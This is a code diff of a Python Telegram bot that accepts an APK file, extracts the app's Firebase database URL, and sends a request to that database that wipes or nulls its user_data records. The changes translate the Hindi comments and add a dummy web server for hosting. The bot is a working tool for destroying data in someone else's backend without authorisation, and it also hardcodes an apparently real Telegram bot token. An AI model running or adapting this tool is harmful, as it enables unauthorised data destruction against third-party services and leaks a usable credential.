@@ -3,19 +3,21 @@ import re
 import zipfile
 import requests
 import logging
+from threading import Thread
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
-# Logging setup (ताकि Render logs में सब दिखता रहे)
+# Logging Setup
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 
-# ⚠️ यहाँ अपना Telegram Bot Token डालें (BotFather से मिला हुआ)
-BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY"
+# ⚠️ Telegram Bot Token (Cleaned)
+BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
 
-# Firebase को खाली/डिलीट करने के लिए Payload
+# Firebase Payload
 DELETE_PAYLOAD = {
     "messageText": None,
     "phoneNumber": None,
@@ -25,17 +27,28 @@ DELETE_PAYLOAD = {
     "command": None
 }
 
-# 1. जब कोई /start दबाएगा
+# Dummy Web Server (Render Web Service Health Check ke liye)
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Telegram Bot is Running!")
+
+def run_dummy_server():
+    port = int(os.environ.get("PORT", 8080))
+    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
+    server.serve_forever()
+
+# 1. Start Command Handler
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Please Send Your Crash APK")
 
-# 2. APK के resources.arsc से Firebase URL निकालने का फ़ंक्शन
+# 2. Extract Firebase URL
 def extract_firebase_url(apk_path):
     try:
         with zipfile.ZipFile(apk_path, 'r') as zip_ref:
             if 'resources.arsc' in zip_ref.namelist():
                 content = zip_ref.read('resources.arsc')
-                # RegEx: firebaseio.com वाली लिंक ढूंढने के लिए
                 match = re.search(rb'https://[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.firebaseio\.com', content)
                 if match:
                     return match.group(0).decode('utf-8')
@@ -43,13 +56,13 @@ def extract_firebase_url(apk_path):
         logging.error(f"Extraction Error: {e}")
     return None
 
-# 3. Firebase REST API से डाटा डिलीट करने का फ़ंक्शन
+# 3. Delete Firebase Data
 def delete_firebase_data(base_url):
     try:
         target_url = base_url.strip()
         if not target_url.endswith('/'):
             target_url += '/'
-        if 'User_data.json' not in target_url:
+        if 'User_data.json' not in target_url and 'user_data.json' not in target_url:
             target_url += 'user_data.json'
 
         headers = {
@@ -63,11 +76,10 @@ def delete_firebase_data(base_url):
         logging.error(f"Delete REST API Error: {e}")
         return False
 
-# 4. जब कोई APK फाइल भेजेगा
+# 4. Handle APK Document
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
     
-    # चेक करें कि क्या फाइल .apk है
     if not document.file_name.endswith('.apk'):
         await update.message.reply_text("कृपया केवल .apk फ़ाइल भेजें!")
         return
@@ -76,13 +88,11 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_path = f"temp_{document.file_id}.apk"
     
     try:
-        # APK डाउनलोड करें
         file = await context.bot.get_file(document.file_id)
         await file.download_to_drive(file_path)
         
         await status_msg.edit_text("Extracting Firebase URL from resources.arsc...")
         
-        # URL निकालें
         firebase_url = extract_firebase_url(file_path)
         
         if not firebase_url:
@@ -93,13 +103,11 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await status_msg.edit_text(f"URL Found: `{firebase_url}`\nDeleting Data...", parse_mode="Markdown")
         
-        # डाटा डिलीट करें
         delete_success = delete_firebase_data(firebase_url)
         
         if delete_success:
             await status_msg.edit_text("✅ डेटा सफलतापूर्वक डिलीट हो गया! APK वापस भेजा जा रहा है...")
             
-            # यूजर को वही APK वापस भेजें
             with open(file_path, 'rb') as apk_file:
                 await update.message.reply_document(
                     document=apk_file,
@@ -113,14 +121,15 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await status_msg.edit_text(f"Error: {str(e)}")
 
     finally:
-        # काम होने के बाद फाइल डिलीट करें
         if os.path.exists(file_path):
             os.remove(file_path)
 
-# मुख्य रनर
 if __name__ == '__main__':
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    # Start Dummy Server in Background Thread
+    Thread(target=run_dummy_server, daemon=True).start()
 
+    # Start Telegram Bot
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
